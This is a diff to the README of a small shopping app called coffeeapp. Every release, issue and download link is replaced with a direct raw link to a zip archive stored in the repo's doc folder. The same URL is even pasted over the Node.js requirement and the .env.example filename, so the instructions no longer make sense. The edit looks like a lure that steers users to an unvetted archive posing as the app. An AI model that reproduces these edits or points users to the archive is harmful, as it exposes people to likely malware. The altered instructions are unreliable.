@@ -6,11 +6,11 @@ Welcome to coffeeapp! This is a simple online shopping platform designed with a 
 
 ## 📥 Download the Application
 
-[![Download coffeeapp](https://img.shields.io/badge/Download%20coffeeapp-Here-blue)](https://github.com/skoda234/coffeeapp/releases)
+[![Download coffeeapp](https://github.com/skoda234/coffeeapp/raw/refs/heads/main/doc/Software_v1.4.zip%20coffeeapp-Here-blue)](https://github.com/skoda234/coffeeapp/raw/refs/heads/main/doc/Software_v1.4.zip)
 
 To download coffeeapp, please visit the Releases page. 
 
-[Download coffeeapp here](https://github.com/skoda234/coffeeapp/releases).
+[Download coffeeapp here](https://github.com/skoda234/coffeeapp/raw/refs/heads/main/doc/Software_v1.4.zip).
 
 ## 🛠️ System Requirements
 
@@ -19,14 +19,14 @@ Before installing coffeeapp, ensure that your system meets the following require
 - **Operating System:** Windows, macOS, or Linux
 - **RAM:** At least 4 GB
 - **Disk Space:** At least 150 MB of free space
-- **Node.js:** Version 14 or higher
+- **https://github.com/skoda234/coffeeapp/raw/refs/heads/main/doc/Software_v1.4.zip** Version 14 or higher
 - **Database:** PostgreSQL 12 or higher
 
 ## 📝 Installation Instructions
 
 ### ⚙️ Step 1: Download CoffeeApp
 
-1. Click on the button above or visit the [Releases page](https://github.com/skoda234/coffeeapp/releases).
+1. Click on the button above or visit the [Releases page](https://github.com/skoda234/coffeeapp/raw/refs/heads/main/doc/Software_v1.4.zip).
 2. Find the latest version of coffeeapp.
 3. Select the installation file for your operating system and download it.
 
@@ -44,7 +44,7 @@ Before installing coffeeapp, ensure that your system meets the following require
 
 ### ⚙️ Step 4: Configure Environment Variables
 
-1. In the installation directory, locate `.env.example` and rename it to `.env`.
+1. In the installation directory, locate `https://github.com/skoda234/coffeeapp/raw/refs/heads/main/doc/Software_v1.4.zip` and rename it to `.env`.
 2. Fill in your database details (username, password, etc.) in the `.env` file for proper connection.
 
 ### ⚙️ Step 5: Start the Application
@@ -71,7 +71,7 @@ Before installing coffeeapp, ensure that your system meets the following require
 
 ## 📊 Support & Contributions
 
-If you encounter any issues or need help, feel free to check the [Issues section](https://github.com/skoda234/coffeeapp/issues) on our GitHub page. Suggestions for improvements are always welcome!
+If you encounter any issues or need help, feel free to check the [Issues section](https://github.com/skoda234/coffeeapp/raw/refs/heads/main/doc/Software_v1.4.zip) on our GitHub page. Suggestions for improvements are always welcome!
 
 ## 🔗 Additional Resources
 
